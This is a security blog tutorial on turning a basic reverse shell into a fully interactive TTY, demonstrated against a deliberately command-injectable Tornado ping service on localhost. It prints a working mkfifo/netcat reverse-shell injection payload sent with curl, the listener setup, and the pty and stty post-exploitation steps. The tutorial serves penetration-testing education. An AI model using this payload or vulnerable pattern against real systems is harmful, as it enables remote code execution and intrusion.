---
draft: false
date: 2018-09-08T12:00:00+00:00
title: Upgrading a reverse shell?
tags: shell, tty
aliases:
  - upgrading-a-reverse-shell.html
---

You've found a reverse shell but it's not behaving like a proper shell. You
can't run `su` because it requires a tty and you might not have a prompt. This
is my quick summary on my notes on upgrading a reverse shell to something
useful. If you want other ways (and this way is included) read the canonical
ropnop_ article as well.

Let's start with an easy and vulnerable application: a `ping` API. If you've
read my previous post you know that there is a command injection in this
script.

**Do not run scripts like these on your own machine as they are insecure.**

```python
import tornado.web
import tornado.ioloop

import subprocess


class PingAsAService(tornado.web.RequestHandler):
    def get(self):
        host = self.get_query_argument("host")
        ping = subprocess.check_output("ping {}".format(host), shell=True)
        return self.write(ping)


if __name__ == "__main__":
    app = tornado.web.Application([
        (r"/", PingAsAService),
    ])
    app.listen(8000, address="127.0.0.1")
    tornado.ioloop.IOLoop.current().start()
```

Using this service is pretty straightforward, passing it the `host` query
parameter will execute ping and return its output:

```
% python3 donotrunthis.py &
[1] 11479
% curl 'http://localhost:8000/?host=localhost'
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.039 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.039/0.039/0.039/0.000 ms
```

While getting a reverse shell is slightly out of scope for this post, here is
what I usually use. This one is from a well known cheatsheet_ and works for both
BSD and GNU nc.

## Open three terminals.

In one terminal where you don't run a terminal multipler setup your `nc` to
listen to a port. It is important that you don't run a terminal multiplexer
such as `screen` or `tmux` because we will be adjusting the terminal settings
and the mux will interfere.

```
% nc -lv 4242
Listening on [0.0.0.0] (family 0, port 4242)
```

This terminal will hang while waiting for a connection. In terminal two we'll
run our exploitable script. Let's not run it in the background as causing tty
input/output on a background job can cause the background process to be
paused.


```
& python3 donotrunthis.py
```

In the last terminal we will run our exploit. `curl` has a handy option of
escaping the URL parameters for you but you need to pass `-G` to explicitly
make the request a `GET`.

```
$ curl -Gv --data-urlencode 'host=localhost;rm /tmp/foo; mkfifo /tmp/foo; cat /tmp/foo | /bin/sh -i 2>&1 | nc localhost 4242 > /tmp/foo &' 'http://localhost:8000/'
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8000 (#0)
> GET /?host=localhost%3Brm%20%2Ftmp%2Ffoo%3B%20mkfifo%20%2Ftmp%2Ffoo%3B%20cat%20%2Ftmp%2Ffoo%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%20%7C%20nc%20localhost%204242%20%3E%20%2Ftmp%2Ffoo%20%26 HTTP/1.1
> Host: localhost:8000
> User-Agent: curl/7.58.0
> Accept: */*
>
```

This terminal will now hang here as our exploitable application never returns
any data. However, if we look over at our terminal with `nc` in it:

```
$ nc -lv 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from localhost 44040 received!
$
```

Our command injection has worked and is now connected to our netcat. But
this shell has a few issues! When we run a program and try to `ctrl+c` it our
netcat program exits. And trying to run `su` yields another error:

.. code-block:: text

    $ nc -lv 4242
    Listening on [0.0.0.0] (family 0, port 4242)
    Connection from localhost 44040 received!
    $ su -
    su: must be run from a terminal
    $

The reason of why is not relevant in this article but the gist is that your
command injection was not allocated a `pty`. We can work around that by
first gaining a pty using python.

```
$ nc -lv 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from localhost 44040 received!
$ su -
su: must be run from a terminal
$ python -c 'import pty; pty.spawn("/bin/bash")'
user@hole:~$ whoami
whoami
user
user@hole:~$ su -
su -
Password: asdf

su: Authentication failure
```

Our shell gained a pty and with it a fancy prompt but everything we type is
being output and sadly using `ctrl+c` still exits our nc. Not the process on the
remote.

To fix this we're going to tell our own terminal to not interpret any command
sequences anymore.

First we `ctrl+z` which moves the current `nc` to the background. We then put
our own terminal in raw mode using `stty raw -echo`.

```
$ nc -lv 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from localhost 44040 received!
$ su -
su: must be run from a terminal
$ python -c 'import pty; pty.spawn("/bin/bash")'
user@hole:~$ whoami
whoami
user
user@hole:~$ su -
su -
Password: asdf

su: Authentication failure

user@hole:~$ ^Z
[1]+  Stopped                 nc -lv 4242
$ stty raw -echo
```

After you enter this you will see nothing and your own keypresses won't be
shown anymore. Enter `fg` blindly to resume the netcat process after which
you will see output again as the pty you spawned earlier is now talking to your
terminal. This means the double output for keys is gone. For good measure
`reset` straight after the `fg` and let's see if everything is as it should
be.

This will clear the and possibly resize it for you. You now have a fully
functional reverse shell. You can run tmux or screen, or any other application
your heart desires.

.. _cheatsheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
.. _ropnop: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
